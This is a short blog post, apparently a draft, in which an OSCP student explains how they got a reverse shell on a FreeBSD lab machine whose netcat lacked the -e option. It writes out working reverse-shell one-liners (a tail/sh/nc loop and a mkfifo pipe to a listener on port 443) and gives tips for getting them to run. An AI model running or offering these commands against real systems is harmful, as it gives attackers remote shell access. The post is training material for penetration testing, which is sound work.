---
layout: inner
title: 'Using netcat without -e'
date: 2017-08-26 01:37
categories: security draft
tags: netcat hack draft
featured_image: '/images/posts/netcat-a-swiss-army-tool-1-638.jpg'
lead_text: 'Okay, okay, this is some kind of insiders thing. If you dont know what Im talking about from the title of this article, then there is nothing to see... Please move along!'
---

Recently in my OSCP course, I was struggeling a few hours to get a reversed shell connection. It was a FreeBSD box, not quite my expertise.

<img src="/images/posts/netcat_freebsd.png" 
     alt="Netcat on FreeBSD"
     width="320px"
     class="media pull-right image-thumbnail">
I immediately found that netcat was installed, but ofcourse [without the e-option](https://www.google.nl/search?q=netcat+GAPING_SECURITY_HOLE). All references to netcat without -e suggest you use  After trying harder for many many many tries, I finally came up with the following solution.

1. Use tail -f to feed commands from a temporary file to bash. (Using -n 0 to ignore any current content of the temporary file.)
2. Redirect the output of the shell command to netcat.
3. Redirect the output of netcat to the temporary file, so the tail command picks it up...

The result looks like:
{% highlight bash %}
tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 10.11.0.49 443 1> /tmp/1
{% endhighlight %}

And don't forget, all your commands are stored in the /tmp/1 file... (ツ)

From many other options I found, none seemed to work. A quick test showed that the famous [/dev/tcp/<ip>/<port>](http://www.gnucitizen.org/blog/reverse-shell-with-bash/) did not work either. The following command did not result in any response on my machine.

{% highlight bash %}
echo foo > /dev/tcp/10.11.0.13/443
{% endhighlight %}

Ofcourse, after having rooted the machine, I was still wondering whether other options found on the internet could work too. In my case I was able to execute multiple commands by separating them with a semicolon. This way a pipe is created first, followed by: netcat reading input from that pipe, netcat redirecting output to bash, bash redirecting stderr and stdout to the pipe again.

{% highlight bash %}
mkfifo pipe; nc -nv 10.11.0.13 443 < pipe | /bin/sh 2>pipe >pipe 
{% endhighlight %}

To wrap up, which things slowed me down finding a way to obtain a reverse shell?
1. Not understanding the "mkfifo pipe" command. This command makes a pipe in the _current_ directory. So not having any rights there, just really does not help...
2. Forgetting that the & character should be url encoded _and_ not by using &amp;. This made me lose the stderr output, that just really does not help either...
3. When uname -a gives back "FreeBSD ... amd64" you probably should not try your Linux/x86 binaries. Oke, but where/how do I get a FreeBSD/amd64 payload?
4. Oh, and last: chmod +x did not work, chmod 777 did the job... (◔_◔)
